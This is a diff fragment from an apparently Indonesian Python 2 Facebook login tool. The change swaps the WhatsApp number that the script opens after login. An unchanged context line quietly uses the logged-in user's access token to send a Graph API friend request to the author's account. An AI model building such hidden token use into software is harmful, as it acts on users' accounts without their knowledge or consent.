@@ -96,7 +96,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://api.whatsapp.com/send?phone=+6287881145568&text=Halo%20Admin%20semoga%20harimu%20menyenangkan%20^-^')
+                os.system('xdg-open https://api.whatsapp.com/send?phone=6281376441665&text=Halo%20Admin%20semoga%20harimu%20menyenangkan%20^-^')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
